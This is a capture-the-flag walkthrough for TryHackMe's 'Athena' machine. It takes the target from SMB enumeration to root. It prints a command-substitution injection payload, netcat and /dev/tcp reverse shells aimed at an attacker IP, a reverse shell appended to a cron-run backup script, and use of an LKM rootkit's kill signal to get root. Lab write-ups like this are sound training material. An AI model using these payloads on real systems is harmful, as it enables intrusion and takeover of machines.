# Try Hack Me - Athena
# Author: Atharva Bordavekar
# Difficulty: Medium
# Points: 60
# Vulnerabilities:

# Phase 1 - Reconnaissance:
nmap scan:
```bash
nmap -p- --min-rate=1000 <target_ip>
```
PORT    STATE SERVICE

22/tcp  open  ssh

80/tcp  open  http

139/tcp open  netbios-ssn

445/tcp open  microsoft-ds

lets enumerate the webpage at port 80. after checking the source code and fuzzing the directories, i found nothing. so lets head onto the samba shares and find out what shares we can access.

```bash
smbclient -L <target_ip> -N
```


we find a share named public. lets access it and find out what contents are present on the share.

```bash
smbclient -N //<target_ip>/public -N
```
we find a `msg_for_administrator.txt` on the share. lets quickly transfer it to our attacker machine and read it.

```bash
get msg_for_administrator
```
we find a message which reveals a hidden directory which can carry out ping command on ip adresses. 

this is a golden opportunity for command injection! after an hour of manual enumeration by using all command seperators possible and all the ways to bypass filters, i hit a dead end. i even tried using a tool named commix which automates command injection, but failed. i used help from DeepSeek and then it suggested me to use command substitution since it bypasses most of the general RCE filters.

```bash
# in the input field
127.0.0.1+$(sleep 5)
```
the command injection works as the browser buffers for 5 seconds. now we will craft a reverseshell. since the operators like & are blocked, we will use a simpler reverseshell payload to bypass it

```bash
# first setup a netcat listner:
nc -lnvp 4444
```
```bash
# in the input field paste this:
127.0.0.1+$(nc -e /bin/bash <attacker_ip> 4444)
```
and just like that we have successfully achieved RCE using command substitution and got a shell as www-data! lets start enumerating the system with linpeas. the output shows us a suspicious backup.sh script in the /usr/share/backup directory which is owned by athena and www-data has read/write/execute permissions to it. we will simply append a reverseshell into the existing script. the script must run automatically. i scanned the machine using pspy64 and found out that the script was running acutomatically.

```bash
# first setup a netcat listner:
nc -lnvp 1234
```
```bash
# on your target machine:
echo 'bash -i >& /dev/tcp/<attacker_ip>/1234 0>&1' >> /usr/share/backup/backup.sh
```
now after some time we get a shell as athena! lets find whether athena has any sudo privileges or not using sudo -l

```bash
sudo -l
```
as you can see, athena can run a binary named venom.ko. lets use the strings command on the binary to find out what is the binary about.

```bash
strings venom.ko
```
we find out that it is an LKM rootkit by the author m0nad. searching for `LKM rootkit m0nad` , we find a github repository named Diamorphine. on analysing it, we find out that we can get added to the root group by signal 64 to any pid. since the name of the binary and the one which we found on github are not same, the pid required to get a root must also be different. but for just the sake of it we will test if we get added to the root group using the pid 64. turns out we do not. now lets transfer the binary onto our attacker machine and analyse the binary using Ghidra. 

```bash
# on your target machine:
cd /mnt/.../secret #first navigate to the location of the binary

# now start a python listener:
python3 -m http.server 8000
```
```bash
# on your attacker machine:
wget http://<target_machine>:8000/venom.ko
```
now launch ghidra and create a new project. import the venom.ko file and start analysing. use the auto analyser feature to speed things up. now we just have to take a look at the function hacked_kill(). 

now as we can see in the decompiler output, the decimal number 57 is required to get added in the root group. lets do that as quick as possible

```bash
# on your target machine:
sudo /usr/sbin/insmod /mnt/.../secret/venom.ko

# after some time, enter this:
kill -57 $$
```
and just like that we have been added to the root group. now we can simply run `sudo su` and read aswell as submit the root.txt flag.
